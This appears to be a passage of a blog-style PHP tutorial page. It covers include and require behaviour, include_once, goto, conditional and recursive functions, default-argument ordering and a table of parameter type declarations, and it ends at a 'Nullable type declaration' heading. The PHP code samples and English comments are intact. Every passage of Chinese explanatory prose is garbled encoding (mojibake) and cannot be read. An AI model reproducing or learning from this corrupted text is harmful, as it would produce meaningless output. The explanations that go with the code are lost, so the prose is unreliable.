<p>å¦‚æœæ²¡æœ‰ç»™å‡ºç›®å½•ï¼ˆåªæœ‰æ–‡ä»¶åï¼‰æ—¶åˆ™æŒ‰ç…§ <a href="https://www.php.net/manual/zh/ini.core.php#ini.include-path" target="_blank" rel="noopener">include_path</a> æŒ‡å®šçš„ç›®å½•å¯»æ‰¾ã€‚å¦‚æœåœ¨ <a href="https://www.php.net/manual/zh/ini.core.php#ini.include-path" target="_blank" rel="noopener">include_path</a> ä¸‹æ²¡æ‰¾åˆ°è¯¥æ–‡ä»¶åˆ™ <em>include</em> æœ€åæ‰åœ¨è°ƒç”¨è„šæœ¬æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾ã€‚å¦‚æœå®šä¹‰äº†è·¯å¾„ï¼ˆç»å¯¹å’Œç›¸å¯¹ï¼‰<a href="https://www.php.net/manual/zh/ini.core.php#ini.include-path" target="_blank" rel="noopener">include_path</a> ä¼šè¢«å®Œå…¨å¿½ç•¥ã€‚</p>
<p>å½“ä¸€ä¸ªæ–‡ä»¶è¢«åŒ…å«æ—¶ï¼Œå…¶ä¸­æ‰€åŒ…å«çš„ä»£ç ç»§æ‰¿äº† include æ‰€åœ¨è¡Œçš„<a href="https://www.php.net/manual/zh/language.variables.scope.php" target="_blank" rel="noopener">å˜é‡èŒƒå›´</a>ã€‚ä»è¯¥å¤„å¼€å§‹ï¼Œè°ƒç”¨æ–‡ä»¶åœ¨è¯¥è¡Œå¤„å¯ç”¨çš„ä»»ä½•å˜é‡åœ¨è¢«è°ƒç”¨çš„æ–‡ä»¶ä¸­ä¹Ÿéƒ½å¯ç”¨ã€‚ä¸è¿‡æ‰€æœ‰åœ¨åŒ…å«æ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°å’Œç±»éƒ½å…·æœ‰å…¨å±€ä½œç”¨åŸŸï¼ˆ?ï¼‰ã€‚</p>
<p>å¦‚æœ include å‡ºç°äºè°ƒç”¨æ–‡ä»¶ä¸­çš„ä¸€ä¸ªå‡½æ•°é‡Œï¼Œåˆ™è¢«è°ƒç”¨çš„æ–‡ä»¶ä¸­æ‰€åŒ…å«çš„æ‰€æœ‰ä»£ç å°†è¡¨ç°å¾—å¦‚åŒå®ƒä»¬æ˜¯åœ¨è¯¥å‡½æ•°å†…éƒ¨å®šä¹‰çš„ä¸€æ ·ã€‚æ‰€ä»¥å®ƒå°†éµå¾ªè¯¥å‡½æ•°çš„å˜é‡èŒƒå›´ã€‚æ­¤è§„åˆ™çš„ä¸€ä¸ªä¾‹å¤–æ˜¯<a href="https://www.php.net/manual/zh/language.constants.predefined.php" target="_blank" rel="noopener">é­”æœ¯å¸¸é‡</a>ï¼Œå®ƒä»¬æ˜¯åœ¨å‘ç”ŸåŒ…å«ä¹‹å‰å°±å·²è¢«è§£æå™¨å¤„ç†çš„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'vars.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A $color $fruit"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* vars.php is in the scope of foo() so     *</span></span><br><span class="line"><span class="comment"> * $fruit is NOT available outside of this  *</span></span><br><span class="line"><span class="comment"> * scope.  $color is because we declared it *</span></span><br><span class="line"><span class="comment"> * as global.                               */</span></span><br><span class="line"></span><br><span class="line">foo();                    <span class="comment">// A green apple</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"A $color $fruit"</span>;   <span class="comment">// A green</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“ä¸€ä¸ªæ–‡ä»¶è¢«åŒ…å«æ—¶ï¼Œè¯­æ³•è§£æå™¨åœ¨ç›®æ ‡æ–‡ä»¶çš„å¼€å¤´è„±ç¦» PHP æ¨¡å¼å¹¶è¿›å…¥ HTML æ¨¡å¼ï¼Œåˆ°æ–‡ä»¶ç»“å°¾å¤„æ¢å¤ã€‚ç”±äºæ­¤åŸå› ï¼Œç›®æ ‡æ–‡ä»¶ä¸­éœ€è¦ä½œä¸º PHP ä»£ç æ‰§è¡Œçš„ä»»ä½•ä»£ç éƒ½å¿…é¡»è¢«åŒ…æ‹¬åœ¨<a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">æœ‰æ•ˆçš„ PHP èµ·å§‹å’Œç»“æŸæ ‡è®°</a>ä¹‹ä¸­ã€‚ï¼ˆæ–‡ä»¶ä¸­çš„htmlå†…å®¹ä¼šè¢«ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ã€‚ï¼‰</p>
<p>å¦‚æœâ€œ<a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener">URL include wrappers</a>â€åœ¨ PHP ä¸­è¢«æ¿€æ´»ï¼Œå¯ä»¥ç”¨ URLï¼ˆé€šè¿‡ HTTP æˆ–è€…å…¶å®ƒæ”¯æŒçš„å°è£…åè®®â€”â€”è§<a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">æ”¯æŒçš„åè®®å’Œå°è£…åè®®</a>ï¼‰è€Œä¸æ˜¯æœ¬åœ°æ–‡ä»¶æ¥æŒ‡å®šè¦è¢«åŒ…å«çš„æ–‡ä»¶ï¼ˆè¿œç¨‹åŒ…å«ï¼‰ã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨å°†ç›®æ ‡æ–‡ä»¶ä½œä¸º PHP ä»£ç è§£é‡Šï¼Œåˆ™å¯ä»¥ç”¨é€‚ç”¨äº HTTP GET çš„ URL è¯·æ±‚å­—ç¬¦ä¸²æ¥å‘è¢«åŒ…æ‹¬çš„æ–‡ä»¶ä¼ é€’å˜é‡ã€‚ä¸¥æ ¼çš„è¯´è¿™å’ŒåŒ…å«ä¸€ä¸ªæ–‡ä»¶å¹¶ç»§æ‰¿çˆ¶æ–‡ä»¶çš„å˜é‡ç©ºé—´å¹¶ä¸æ˜¯ä¸€å›äº‹ï¼›è¯¥è„šæœ¬æ–‡ä»¶å®é™…ä¸Šå·²ç»åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šè¿è¡Œäº†ï¼Œè€Œæœ¬åœ°è„šæœ¬åˆ™åŒ…æ‹¬äº†å…¶ç»“æœã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This example assumes that www.example.com is configured to parse .php *</span></span><br><span class="line"><span class="comment"> * files and not .txt files. Also, 'Works' here means that the variables *</span></span><br><span class="line"><span class="comment"> * $foo and $bar are available within the included file.                 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Won't work; file.txt wasn't handled by www.example.com as PHP</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Won't work; looks for a file named 'file.php?foo=1&amp;bar=2' on the</span></span><br><span class="line"><span class="comment">// local filesystem.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'file.php?foo=1&amp;bar=2'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Works.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'http://www.example.com/file.php?foo=1&amp;bar=2'</span>;</span><br><span class="line"></span><br><span class="line">$foo = <span class="number">1</span>;</span><br><span class="line">$bar = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'file.txt'</span>;  <span class="comment">// Works.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'file.php'</span>;  <span class="comment">// Works.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸º <em>include</em> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¯­è¨€ç»“æ„ï¼Œå…¶å‚æ•°ä¸éœ€è¦æ‹¬å·ã€‚åœ¨æ¯”è¾ƒå…¶è¿”å›å€¼æ—¶è¦æ³¨æ„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// won't work, evaluated as include(('vars.php') == TRUE), i.e. include('')</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">include</span>(<span class="string">'vars.php'</span>) == <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'OK'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// works</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">include</span> <span class="string">'vars.php'</span>) == <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'OK'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>includeå’Œreturnï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$var = <span class="string">'PHP'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $var;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">noreturn.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$var = <span class="string">'PHP'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">testreturns.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">include</span> <span class="string">'return.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $foo; <span class="comment">// prints 'PHP'</span></span><br><span class="line"></span><br><span class="line">$bar = <span class="keyword">include</span> <span class="string">'noreturn.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bar; <span class="comment">// prints 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœåœ¨åŒ…å«æ–‡ä»¶ä¸­å®šä¹‰æœ‰å‡½æ•°ï¼Œè¿™äº›å‡½æ•°ä¸ç®¡æ˜¯åœ¨ <a href="https://www.php.net/manual/zh/function.return.php" target="_blank" rel="noopener">return</a> ä¹‹å‰è¿˜æ˜¯ä¹‹åå®šä¹‰çš„ï¼Œéƒ½å¯ä»¥ç‹¬ç«‹åœ¨ä¸»æ–‡ä»¶ä¸­ä½¿ç”¨ã€‚å¦‚æœæ–‡ä»¶è¢«åŒ…å«ä¸¤æ¬¡ï¼ŒPHP 5 å‘å‡ºè‡´å‘½é”™è¯¯å› ä¸ºå‡½æ•°å·²ç»è¢«å®šä¹‰ï¼Œä½†æ˜¯ PHP 4 ä¸ä¼šå¯¹åœ¨ <a href="https://www.php.net/manual/zh/function.return.php" target="_blank" rel="noopener">return</a> ä¹‹åå®šä¹‰çš„å‡½æ•°æŠ¥é”™ã€‚æ¨èä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.include-once.php" target="_blank" rel="noopener">include_once</a> è€Œä¸æ˜¯æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²åŒ…å«å¹¶åœ¨åŒ…å«æ–‡ä»¶ä¸­æœ‰æ¡ä»¶è¿”å›ã€‚</p>
<p>å°† PHP æ–‡ä»¶â€œåŒ…å«â€åˆ°ä¸€ä¸ªå˜é‡ä¸­çš„æ–¹æ³•æ˜¯ç”¨<a href="https://www.php.net/manual/zh/ref.outcontrol.php" target="_blank" rel="noopener">è¾“å‡ºæ§åˆ¶å‡½æ•°</a>ç»“åˆ <strong>include</strong> æ¥æ•è·å…¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = get_include_contents(<span class="string">'somefile.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_include_contents</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_file($filename)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">include</span> $filename;</span><br><span class="line">        $contents = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¦åœ¨è„šæœ¬ä¸­è‡ªåŠ¨åŒ…å«æ–‡ä»¶ï¼Œå‚è§ php.ini ä¸­çš„ <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-prepend-file" target="_blank" rel="noopener">auto_prepend_file</a> å’Œ <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file" target="_blank" rel="noopener">auto_append_file</a> é…ç½®é€‰é¡¹ã€‚</p>
<blockquote>
<p><strong>Note</strong>: å› ä¸ºæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢« <a href="https://www.php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">å¯å˜å‡½æ•°</a> è°ƒç”¨ã€‚</p>
</blockquote>
<h3 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once/require_once"></a>include_once/require_once</h3><p>åªåŒ…å«ä¸€æ¬¡ã€‚</p>
<blockquote>
<p>Note:</p>
<p>åœ¨ PHP 4ä¸­ï¼Œ_once çš„è¡Œä¸ºåœ¨ä¸åŒºåˆ†å¤§å°å†™å­—æ¯çš„æ“ä½œç³»ç»Ÿï¼ˆä¾‹å¦‚ Windowsï¼‰ä¸­æœ‰æ‰€ä¸åŒï¼Œä¾‹å¦‚ï¼š</p>
<p>Example #1 include_once åœ¨ PHP 4 è¿è¡Œäºä¸åŒºåˆ†å¤§å°å†™çš„æ“ä½œç³»ç»Ÿä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"a.php"</span>; <span class="comment">// è¿™å°†åŒ…å« a.php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"A.php"</span>; <span class="comment">// è¿™å°†å†æ¬¡åŒ…å« a.phpï¼ï¼ˆä»… PHP 4ï¼‰</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ­¤è¡Œä¸ºåœ¨ PHP 5 ä¸­æ”¹äº†ï¼Œä¾‹å¦‚åœ¨ Windows ä¸­è·¯å¾„å…ˆè¢«è§„æ ¼åŒ–ï¼Œå› æ­¤ C:\PROGRA~1\A.php å’Œ C:\Program Files\a.php çš„å®ç°ä¸€æ ·ï¼Œæ–‡ä»¶åªä¼šè¢«åŒ…å«ä¸€æ¬¡ã€‚</p>
</blockquote>
<h3 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h3><p>PHP ä¸­çš„ <em>goto</em> æœ‰ä¸€å®šé™åˆ¶ï¼Œç›®æ ‡ä½ç½®åªèƒ½ä½äºåŒä¸€ä¸ªæ–‡ä»¶å’Œä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•è·³å‡ºä¸€ä¸ªå‡½æ•°æˆ–ç±»æ–¹æ³•ï¼Œä¹Ÿæ— æ³•è·³å…¥åˆ°å¦ä¸€ä¸ªå‡½æ•°ã€‚ä¹Ÿæ— æ³•è·³å…¥åˆ°ä»»ä½•å¾ªç¯æˆ–è€… switch ç»“æ„ä¸­ã€‚å¯ä»¥è·³å‡ºå¾ªç¯æˆ–è€… switchï¼Œé€šå¸¸çš„ç”¨æ³•æ˜¯ç”¨ <em>goto</em> ä»£æ›¿å¤šå±‚çš„ <em>break</em>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>,$j=<span class="number">50</span>; $i&lt;<span class="number">100</span>; $i++) &#123;</span><br><span class="line">  <span class="keyword">while</span>($j--) &#123;</span><br><span class="line">    <span class="keyword">if</span>($j==<span class="number">17</span>) <span class="keyword">goto</span> end; </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"i = $i"</span>;</span><br><span class="line">end:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'j hit 17'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// æ— æ•ˆå†™æ³•</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">goto</span> loop;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>,$j=<span class="number">50</span>; $i&lt;<span class="number">100</span>; $i++) &#123;</span><br><span class="line">  <span class="keyword">while</span>($j--) &#123;</span><br><span class="line">    loop:</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$i = $i"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Note</strong>:</p>
<p>goto æ“ä½œç¬¦ä»…åœ¨ PHP 5.3åŠä»¥ä¸Šç‰ˆæœ¬æœ‰æ•ˆã€‚</p>
</blockquote>
<h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><h3 id="è‡ªå®šä¹‰å‡½æ•°"><a href="#è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="è‡ªå®šä¹‰å‡½æ•°"></a>è‡ªå®šä¹‰å‡½æ•°</h3><p>ä»»ä½•æœ‰æ•ˆçš„ PHP ä»£ç éƒ½æœ‰å¯èƒ½å‡ºç°åœ¨å‡½æ•°å†…éƒ¨ï¼Œç”šè‡³åŒ…æ‹¬å…¶å®ƒå‡½æ•°å’Œ<a href="https://www.php.net/manual/zh/language.oop5.basic.php#language.oop5.basic.class" target="_blank" rel="noopener">ç±»</a>å®šä¹‰ã€‚</p>
<p>å‡½æ•°æ— éœ€åœ¨è°ƒç”¨ä¹‹å‰è¢«å®šä¹‰ï¼Œ<em>é™¤é</em>æ˜¯ä¸‹é¢ä¸¤ä¸ªä¾‹å­ä¸­å‡½æ•°æ˜¯æœ‰æ¡ä»¶è¢«å®šä¹‰æ—¶ã€‚å½“ä¸€ä¸ªå‡½æ•°æ˜¯æœ‰æ¡ä»¶è¢«å®šä¹‰æ—¶ï¼Œå¿…é¡»åœ¨è°ƒç”¨å‡½æ•°<em>ä¹‹å‰</em>å®šä¹‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$makefoo = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä¸èƒ½åœ¨æ­¤å¤„è°ƒç”¨foo()å‡½æ•°ï¼Œ</span></span><br><span class="line"><span class="comment">   å› ä¸ºå®ƒè¿˜ä¸å­˜åœ¨ï¼Œä½†å¯ä»¥è°ƒç”¨bar()å‡½æ•°ã€‚*/</span></span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($makefoo) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"I don't exist until program execution reaches me.\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç°åœ¨å¯ä»¥å®‰å…¨è°ƒç”¨å‡½æ•° foo()äº†ï¼Œ</span></span><br><span class="line"><span class="comment">   å› ä¸º $makefoo å€¼ä¸ºçœŸ */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($makefoo) foo();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"I exist immediately upon program start.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"I don't exist until foo() is called.\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç°åœ¨è¿˜ä¸èƒ½è°ƒç”¨bar()å‡½æ•°ï¼Œå› ä¸ºå®ƒè¿˜ä¸å­˜åœ¨ */</span></span><br><span class="line"></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç°åœ¨å¯ä»¥è°ƒç”¨bar()å‡½æ•°äº†ï¼Œå› ä¸ºfoo()å‡½æ•°</span></span><br><span class="line"><span class="comment">   çš„æ‰§è¡Œä½¿å¾—bar()å‡½æ•°å˜ä¸ºå·²å®šä¹‰çš„å‡½æ•° */</span></span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="é€’å½’å‡½æ•°"><a href="#é€’å½’å‡½æ•°" class="headerlink" title="é€’å½’å‡½æ•°"></a><strong>é€’å½’å‡½æ•°</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recursion</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a &lt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$a\n"</span>;</span><br><span class="line">        recursion($a + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Note</strong>: ä½†æ˜¯è¦é¿å…é€’å½’å‡½æ•°ï¼æ–¹æ³•è°ƒç”¨è¶…è¿‡ 100-200 å±‚ï¼Œå› ä¸ºå¯èƒ½ä¼šä½¿å †æ ˆå´©æºƒä»è€Œä½¿å½“å‰è„šæœ¬ç»ˆæ­¢ã€‚ æ— é™é€’å½’å¯è§†ä¸ºç¼–ç¨‹é”™è¯¯ã€‚</p>
</blockquote>
<h3 id="å‡½æ•°å‚æ•°"><a href="#å‡½æ•°å‚æ•°" class="headerlink" title="å‡½æ•°å‚æ•°"></a>å‡½æ•°å‚æ•°</h3><p>æ³¨æ„å½“ä½¿ç”¨é»˜è®¤å‚æ•°æ—¶ï¼Œä»»ä½•é»˜è®¤å‚æ•°å¿…é¡»æ”¾åœ¨ä»»ä½•éé»˜è®¤å‚æ•°çš„å³ä¾§ï¼›å¦åˆ™ï¼Œå‡½æ•°å°†ä¸ä¼šæŒ‰ç…§é¢„æœŸçš„æƒ…å†µå·¥ä½œã€‚è€ƒè™‘ä¸‹é¢çš„ä»£ç ç‰‡æ–­ï¼š</p>
<p><strong>å‡½æ•°é»˜è®¤å‚æ•°çš„ä¸æ­£ç¡®ç”¨æ³•</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeyogurt</span><span class="params">($type = <span class="string">"acidophilus"</span>, $flavour)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Making a bowl of $type $flavour.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> makeyogurt(<span class="string">"raspberry"</span>);   <span class="comment">// won't work as expected</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä¾‹ç¨‹ä¼šè¾“å‡ºï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Warning</span>: Missing argument <span class="number">2</span> <span class="keyword">in</span> <span class="keyword">call</span> <span class="keyword">to</span> makeyogurt() <span class="keyword">in</span> </span><br><span class="line">/usr/<span class="keyword">local</span>/etc/httpd/htdocs/phptest/functest.html <span class="keyword">on</span> <span class="type">line</span> <span class="number">41</span></span><br><span class="line">Making a bowl <span class="keyword">of</span> raspberry .</span><br></pre></td></tr></table></figure>

<p>æ­£ç¡®ç”¨æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeyogurt</span><span class="params">($flavour, $type = <span class="string">"acidophilus"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Making a bowl of $type $flavour.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> makeyogurt(<span class="string">"raspberry"</span>);   <span class="comment">// works as expected</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å‚æ•°ç±»å‹"><a href="#å‚æ•°ç±»å‹" class="headerlink" title="å‚æ•°ç±»å‹"></a>å‚æ•°ç±»å‹</h3><table>
<thead>
<tr>
<th align="left">type</th>
<th align="left">Description</th>
<th align="left">Minimum PHP version</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Class/interface name</td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.operators.type.php" target="_blank" rel="noopener"><em>instanceof</em></a> the given class or interface name.</td>
<td align="left">PHP 5.0.0</td>
</tr>
<tr>
<td align="left"><em>self</em></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.operators.type.php" target="_blank" rel="noopener"><em>instanceof</em></a> the same class as the one the method is defined on. This can only be used on class and instance methods.</td>
<td align="left">PHP 5.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>.</td>
<td align="left">PHP 5.1.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a></td>
<td align="left">The parameter must be a valid <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a>.</td>
<td align="left">PHP 5.4.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">bool</a></td>
<td align="left">The parameter must be a <a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a> value.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a></td>
<td align="left">The parameter must be a <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>ing point number.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">int</a></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td>
<td align="left">The parameter must be a <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><em>iterable</em></td>
<td align="left">The parameter must be either an <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> or an <a href="https://www.php.net/manual/zh/language.operators.type.php" target="_blank" rel="noopener"><em>instanceof</em></a> <strong>Traversable</strong>.</td>
<td align="left">PHP 7.1.0</td>
</tr>
<tr>
<td align="left"><em>object</em></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a>.</td>
<td align="left">PHP 7.2.0</td>
</tr>
</tbody></table>
<p><strong>Nullable type declaration</strong></p>
